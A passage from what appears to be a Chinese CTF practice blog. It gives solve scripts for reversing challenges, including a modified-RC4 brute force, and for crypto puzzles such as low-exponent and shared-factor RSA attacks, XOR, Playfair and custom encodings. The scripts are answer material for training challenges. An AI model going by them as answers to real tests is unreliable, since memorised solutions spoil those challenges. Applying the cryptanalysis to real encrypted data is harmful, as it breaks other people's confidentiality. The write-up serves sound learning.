class="line">printA(data[dataSeg:])</span><br><span class="line">printA(data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data[dataSeg+<span class="number">5</span>:])):</span><br><span class="line">    dataS.append(data[dataSeg+<span class="number">5</span>+i]^data[i%codeSeg+<span class="number">5</span>])</span><br><span class="line">print(bytes(dataS))</span><br></pre></td></tr></table></figure>
<h2 id="rev-SCTF2019-music"><a href="#rev-SCTF2019-music" class="headerlink" title="[rev][SCTF2019]music"></a>[rev][SCTF2019]music</h2><p>注意eclipse中编码要选择utf-8，否则解不出来</p>
<p>变形rc4，key在数据库中，要比对的数据位于strings.xml，可以使用穷举法，也可以找出异或使用的流密钥然后再异或</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">p</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">(<span class="keyword">byte</span>[] paramArrayOfbyte)</span> </span>&#123;</span><br><span class="line">    StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; paramArrayOfbyte.length; i++) &#123;</span><br><span class="line">      String str2 = Integer.toHexString(paramArrayOfbyte[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">      String str1 = str2;</span><br><span class="line">      <span class="keyword">if</span> (str2.length() == <span class="number">1</span>) &#123;</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        stringBuilder.append(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        stringBuilder.append(str2);</span><br><span class="line">        str1 = stringBuilder.toString();</span><br><span class="line">      &#125; </span><br><span class="line">      stringBuffer.append(str1.toUpperCase());</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> stringBuffer.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> m = <span class="number">256</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">a</span><span class="params">(String paramString1, String paramString2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = m;</span><br><span class="line">    <span class="keyword">int</span>[] arrayOfInt = <span class="keyword">new</span> <span class="keyword">int</span>[i];</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[i];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">      arrayOfInt[i] = i;</span><br><span class="line">      arrayOfByte[i] = (<span class="keyword">byte</span>)paramString2.charAt(i % paramString2.length());</span><br><span class="line">    &#125; </span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">int</span> k = m;</span><br><span class="line">      <span class="keyword">if</span> (i &lt; k - <span class="number">1</span>) &#123;</span><br><span class="line">        j = (arrayOfInt[i] + j + arrayOfByte[i]) % k;</span><br><span class="line">        k = arrayOfInt[i];</span><br><span class="line">        arrayOfInt[i] = arrayOfInt[j];</span><br><span class="line">        arrayOfInt[j] = k;</span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">char</span>[] arrayOfChar2 = paramString1.toCharArray();</span><br><span class="line">      <span class="keyword">char</span>[] arrayOfChar1 = <span class="keyword">new</span> <span class="keyword">char</span>[paramString1.length()];</span><br><span class="line">      k = <span class="number">0</span>;</span><br><span class="line">      j = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arrayOfChar2.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> m = <span class="number">256</span>;</span><br><span class="line">        k = (k + <span class="number">1</span>) % m;</span><br><span class="line">        j = (arrayOfInt[k] + j) % m;</span><br><span class="line">        <span class="keyword">int</span> n = arrayOfInt[k];</span><br><span class="line">        arrayOfInt[k] = arrayOfInt[j];</span><br><span class="line">        arrayOfInt[j] = n;</span><br><span class="line">        n = arrayOfInt[k];</span><br><span class="line">        <span class="keyword">int</span> i1 = arrayOfInt[k];</span><br><span class="line">        arrayOfChar1[i] = (<span class="keyword">char</span>)(arrayOfChar2[i] - k ^ (<span class="keyword">char</span>)arrayOfInt[(n + i1 % m) % m]);</span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">new</span> p();</span><br><span class="line">      <span class="keyword">return</span> p.a((<span class="keyword">new</span> String(arrayOfChar1)).getBytes());</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">char</span> cipher[] = <span class="keyword">new</span> <span class="keyword">char</span>[] &#123;</span><br><span class="line">				<span class="number">0xC2</span>,<span class="number">0x8B</span>,<span class="number">0xC3</span>,<span class="number">0x9D</span>,<span class="number">0xC3</span>,<span class="number">0xA6</span>,<span class="number">0xC2</span>,<span class="number">0x83</span>,<span class="number">0xC2</span>,<span class="number">0xB3</span>,<span class="number">0xC3</span>,<span class="number">0x9D</span>,<span class="number">0xC2</span>,<span class="number">0x93</span>,<span class="number">0xC2</span>,<span class="number">0x89</span>,<span class="number">0xC2</span>,<span class="number">0xB8</span>,<span class="number">0xC3</span>,<span class="number">0xBA</span>,<span class="number">0xC2</span>,<span class="number">0x9E</span>,<span class="number">0xC3</span>,<span class="number">0xA0</span>,<span class="number">0xC3</span>,<span class="number">0xA7</span>,<span class="number">0xC2</span>,<span class="number">0x9A</span>,<span class="number">0x16</span>,<span class="number">0x54</span>,<span class="number">0xC3</span>,<span class="number">0xAF</span>,<span class="number">0x28</span>,<span class="number">0xC3</span>,<span class="number">0xA1</span>,<span class="number">0xC2</span>,<span class="number">0xB1</span>,<span class="number">0x21</span>,<span class="number">0x5B</span>,<span class="number">0x53</span></span><br><span class="line">		&#125;;</span><br><span class="line">		String key = <span class="string">&quot;E7E64BF658BAB14A25C9D67A054CEBE5&quot;</span>;</span><br><span class="line">		String tab = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_+&#123;&#125;/&quot;</span>;</span><br><span class="line"><span class="comment">//		String c = new String(cipher);</span></span><br><span class="line">		String c = <span class="string">&quot;C28BC39DC3A6C283C2B3C39DC293C289C2B8C3BAC29EC3A0C3A7C29A1654C3AF28C3A1C2B1215B53&quot;</span>;</span><br><span class="line">		String now = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		String flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		String res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;!res.equals(c);i++) &#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;tab.length();j++) &#123;</span><br><span class="line">				now=flag+tab.charAt(j);</span><br><span class="line">				res = <span class="keyword">new</span> c().a(now,key);</span><br><span class="line"><span class="comment">//				System.out.println(res);</span></span><br><span class="line">				<span class="keyword">if</span>(c.indexOf(res)==<span class="number">0</span>) &#123;</span><br><span class="line">					flag=now;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">					</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="keyword">new</span> String(flag));</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="crypto-RSA"><a href="#crypto-RSA" class="headerlink" title="[crypto]RSA"></a>[crypto]RSA</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/huxianglin/p/6387045.html">https://www.cnblogs.com/huxianglin/p/6387045.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c93a993f8997">https://www.jianshu.com/p/c93a993f8997</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line">pubKey = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;pub.key&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pubKey = f.read()</span><br><span class="line">key = RSA.importKey(pubKey)</span><br><span class="line">print(key.n,key.e)</span><br><span class="line"><span class="comment"># 放在factordb.com解密</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">e = key.e</span><br><span class="line">n = key.n</span><br><span class="line">d =gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">c = <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c = f.read()</span><br><span class="line">c = bytes_to_long(c)</span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="crypto-异性相吸"><a href="#crypto-异性相吸" class="headerlink" title="[crypto]异性相吸"></a>[crypto]异性相吸</h2><p>两个文件长度相同，猜测是异或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="literal">None</span></span><br><span class="line">c = <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;key.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = f.read()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;密文.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c = f.read()</span><br><span class="line">print(len(key),len(c))</span><br><span class="line">a = [<span class="number">0</span>]*len(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">    a[i]=key[i]^c[i]</span><br><span class="line">print(bytes(a))</span><br></pre></td></tr></table></figure>
<h2 id="crypto-汉字的秘密"><a href="#crypto-汉字的秘密" class="headerlink" title="[crypto]汉字的秘密"></a>[crypto]汉字的秘密</h2><p>当铺编码，根据字的出头数编码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;口由中人工土王夫井壮&#x27;</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">dic[<span class="string">&#x27;士&#x27;</span>]=<span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    dic[a[i]]=i</span><br><span class="line">s = <span class="string">&#x27;王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫&#x27;</span></span><br><span class="line"></span><br><span class="line">sa = s.split(<span class="string">&#x27; &#x27;</span>,<span class="number">-1</span>)</span><br><span class="line">r = []</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sa:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        n = n*<span class="number">10</span>+dic[j]</span><br><span class="line">    r.append(n+cnt+<span class="number">1</span>)</span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">print(r)</span><br><span class="line">print(bytes(r))</span><br><span class="line">print(str(bytes(r),encoding=<span class="string">&#x27;utf-8&#x27;</span>).lower())</span><br></pre></td></tr></table></figure>
<h2 id="crypto-unencode"><a href="#crypto-unencode" class="headerlink" title="[crypto]unencode"></a>[crypto]unencode</h2><p>uuencode编码</p>
<p>类似base64 <a target="_blank" rel="noopener" href="http://web.chacuo.net/charsetuuencode">http://web.chacuo.net/charsetuuencode</a></p>
<h2 id="crypto-Dangerous-RSA"><a href="#crypto-Dangerous-RSA" class="headerlink" title="[crypto]Dangerous RSA"></a>[crypto]Dangerous RSA</h2><p>低加密指数攻击实战</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">n=<span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line">e=<span class="number">0x3</span></span><br><span class="line">c=<span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">    m,ok = gmpy2.iroot(c+n*i,e)</span><br><span class="line">    <span class="keyword">if</span> ok:</span><br><span class="line">        print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h2 id="crypto-Cipher"><a href="#crypto-Cipher" class="headerlink" title="[crypto]Cipher"></a>[crypto]Cipher</h2><p>“公平的玩”给出信息是playfair密码(wtf??)，学到了</p>
<p><a target="_blank" rel="noopener" href="http://rumkin.com/tools/cipher/playfair.php">http://rumkin.com/tools/cipher/playfair.php</a></p>
<p>密钥是playfair</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45784859/article/details/105766145">https://blog.csdn.net/qq_45784859/article/details/105766145</a></p>
<h2 id="crypto-达芬奇密码"><a href="#crypto-达芬奇密码" class="headerlink" title="[crypto]达芬奇密码"></a>[crypto]达芬奇密码</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yao_xin_de_yuan/article/details/108348186">https://blog.csdn.net/yao_xin_de_yuan/article/details/108348186</a></p>
<p>唉，还是得多见。</p>
<p>斐波那契数列的第i项对应着i，第一个数列的意思就是把第二个数列对应位置的数映射到对应位置上面</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711&#x27;</span></span><br><span class="line">r = <span class="string">&#x27;36968853882116725547342176952286&#x27;</span></span><br><span class="line">fib = [<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">cnt = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    fib.append(fib[i]+fib[i+<span class="number">1</span>])</span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(fib)):</span><br><span class="line">    dic[str(fib[i])]=i</span><br><span class="line">s = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line">aa = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(aa)):</span><br><span class="line">    s[dic[aa[i]]]=ord(r[i])</span><br><span class="line">print(bytes(s))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有两个1，所以第一位置可能是7也可能是3，试试就得了</p>
<h2 id="rev-De1CTF2019-cplusplus"><a href="#rev-De1CTF2019-cplusplus" class="headerlink" title="[rev][De1CTF2019]cplusplus"></a>[rev][De1CTF2019]cplusplus</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41252520/article/details/102021262?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/qq_41252520/article/details/102021262?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&amp;spm=1001.2101.3001.4242</a></p>
<ol>
<li>数字1@数字2#数字3</li>
<li>然后转化为三个word数字ns，进入0x29b0</li>
<li>ns[0]&lt;0x6f</li>
<li>有个算法总是逆不出来，只能看wp这样子 原来是梅森旋转法，可以搜常数的</li>
<li>数字2可以通过De1ta反推20637</li>
<li>数字1可以通过patch程序，使其为我们穷举输入的数字，得到0x4e 78</li>
<li>数字3需要调试，发现数字3=3*0x22+12</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;eQDtW91a0qwryuLZvbXCEK8VghjklzxIOPASBNM2RsdfF56TYU34p7ioGHJcnm&#x27;</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">    dic[s[i]]=i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;De1ta&#x27;</span>:</span><br><span class="line">    print(dic[i],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="crypto-RSA5"><a href="#crypto-RSA5" class="headerlink" title="[crypto]RSA5"></a>[crypto]RSA5</h2><p>本以为给那么多n，c对是中国剩余定理，原来是求最大公约数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = []</span><br><span class="line">c=[]</span><br><span class="line">n.append(<span class="number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span>)</span><br><span class="line">c.append( <span class="number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span>)</span><br><span class="line">c.append( <span class="number">15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span 